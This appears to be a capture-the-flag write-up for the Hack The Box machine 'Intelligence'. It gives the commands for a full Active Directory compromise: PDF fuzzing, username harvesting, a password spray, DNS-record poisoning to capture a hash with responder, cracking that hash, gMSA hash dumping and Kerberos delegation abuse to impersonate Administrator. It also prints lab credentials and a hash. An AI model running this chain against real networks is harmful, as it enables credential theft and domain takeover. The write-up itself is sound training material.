1. The machine hosts a website on port 80 containing a basic website referring a couple of pdf at `/documents/` endpoint. The format of the PDFs is the following `YYYY-MM-DD-upload.pdf`
2. We opt to run a script that fuzzes all the available documents for 2020 and 2021. To do that we first take an already existing list for 2020 and 2021 and then customise it with `sed`
```sh
# Copy the existing list
cp /usr/share/seclists/Fuzzing/Dates/2021/2021-MM-DD.txt ./2021-MM-DD.txt
cp /usr/share/seclists/Fuzzing/Dates/2020/2020-MM-DD.txt ./2020-MM-DD.txt

# Modify its content to have the same format of the upload files (appending '-upload.pdf')
sed 's/$/-upload.pdf/' 2021-MM-DD.txt > list2021.txt
sed 's/$/-upload.pdf/' 2020-MM-DD.txt > list2020.txt
```
3. Once obtained the files in the right format we proceed to fuzz the files accordingly
```sh
ffuf -w list2021.txt -u http://intelligence.htb/documents/FUZZ -c -ic
ffuf -w list2020.txt -u http://intelligence.htb/documents/FUZZ -c -ic
```
4. Out of these two lists we'll obtain approx 100 results. We can now format the list accordingly and proceed to use wget to download them all at once:
```sh
for i in $(cat list_of_discovered_PDFs.txt); do wget $i; done
```
![[attachments/intelligence-1.png]]
5. Within `exiftool` we discover that each `/Creator` resembles a possible username, so we opt to extract a list of users to eventually validate with kerbrute. To extract the usernames we can use the following command:
```sh
exiftool *.pdf | grep Creator | awk '{print $3}' > users.txt # awk is used because we want the third string. The first one being Creator, the second ':' and third the username
```
5. We do not find anything else important inside the pdf details, so we proceed to convert the PDFs into text to validate whether there's some sensible content inside, discovering a password hidden into `2020-06-04-upload.txt`
```sh
for i in $(ls); do pdftotext $i; done;
cat *.txt | grep passw -C 2
```
![[attachments/intelligence-2.png]]
6. Once done so, we first opt to validate whether those users are valid with kerbrute:
```sh
kerbrute userenum -d intelligence.htb --dc 10.129.6.123 users.txt
```
7. After validating all the 99 users are valid, we proceed with a password spraying to discover whether any of those 99 is still using the default password, discovering the following user: `Tiffany.Molina:NewIntelligenceCorpUser9876`
```sh
hydra -L users.txt -p 'NewIntelligenceCorpUser9876' smb2://intelligence.htb
```
![[attachments/intelligence-3.png]]
8. We use `nxc` to understand what privileges we have over SMB and discover we can read a few Shares. Inside one in particular `IT` we discover the presence of a `ps1` script named `downdetector.ps1` (we also can catch the user flag from the other SMB share). 
   The `downdetector.ps1` mention that this ps1 script is being executed once every 5 minutes and it seems to check the DNS for records containing specific URL starting with `web*` and using Invoke-WebRequest with `-UseDefaultCredentials` to check whether it's up or down. Below it mentions that, if the status code is not equal to 200 (success) it sends an email to Ted Graves. While we can't take it for granted, it's quite possible that the `-UseDefaultCredentials` might use the credentials of the user Ted Graves.
```powershell
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
9. To properly complete this kind of attack, we must have knowledge of what we can do with an user that has access to AD. In fact, by default an user can add a DNS Record to the AD, this makes it possible for us to add a DNS record starting with `web*` and make it available in order to make the ps1 script ping that endpoint and possibly return us the hash of that user. To do that we'll leverage a tool named `dnstool`:
```sh
# To add the DNS record
python dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web-test12198-0.intelligence.htb -a add -d 10.10.14.194 10.129.6.8

# To check whether the DNS record has been added or not:
python dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web-test12198-0.intelligence.htb -a query -d 10.10.14.194 10.129.6.8
```
![[attachments/intelligence-4.png]]

![[attachments/intelligence-5.png]]
10. Now, we can finally start responder and wait for a hash to arrive to us, discovering the hash of Ted Graves
![[attachments/intelligence-6.png]]

>This passage was particularly tricky. Also, we weren't receiving the hash at first. After disabling iptables and ufw we could receive it confirming it was a firewall problem.

11. Finally, we can crack the hash with `hashcat`, obtaining the user `Ted.Graves:Mr.Teddy`
```sh
hashcat -m 5600 'Ted.Graves::intelligence:747018cba6c27b61:5B9F2EA9FC629613C4684FB10E5AB827:01010000000000002DCA9BBC32B8DC012DC936C29E90DDA60000000002000800440036005100420001001E00570049004E002D00590059004D0030004C004600350059005900430048000400140044003600510042002E004C004F00430041004C0003003400570049004E002D00590059004D0030004C004600350059005900430048002E0044003600510042002E004C004F00430041004C000500140044003600510042002E004C004F00430041004C000800300030000000000000000000000000200000A4653C0A621F6E4CB5C22465974EC828E89410984897F4A59C9680AEE305EF2C0A0010000000000000000000000000000000000009004A0048005400540050002F007700650062002D007400650073007400310032003100390039002D0030002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' /usr/share/wordlists/rockyou.txt
```

12. Within bloodhound, we discover that the user `Ted.Graves` belongs to the group `ITSUPPORT` which has an interesting privilege over the `svc_int` user
![[attachments/intelligence-7.png]]
13. Following the attack path suggested by Bloodhound, we download https://github.com/micahvandeusen/gMSADumper and dump the NT hash of the `svc_int` user
```sh
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'INTELLIGENCE.HTB'
```
![[attachments/intelligence-8.png]]
14. Once obtained the hash of `svc_int` we notice that this user has `AllowedToDelegate` privilege over the Domain Controller. To leverage this we can use `impacket-getST` and gain the DC Administrator's user `ccache` file. The attack vector is a bit picky we must be precise in the information we fill. If we read carefully `bloodhound` tells us that we must use the `SPN` mentioned on `svc_int`
    ![[attachments/intelligence-9.png]]
    then, we required the hash of the `svc_int` user retrieve the `gMSADumper` and then we must specify the user to impersonate and the user we're using for the delegation
```sh
impacket-getST -hashes :d5538dca5ba2ff329c9df39ef130f439 -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'INTELLIGENCE.HTB/svc_int'
```
![[attachments/intelligence-10.png]]
15. Finally, we can now export the ticket to the `KRB5CCNAME` variable and finally authenticate with `impacket-smbexec` or `impacket-wmiexec` or, eventually, use `nxc` to gain control of the DC
![[attachments/intelligence-11.png]]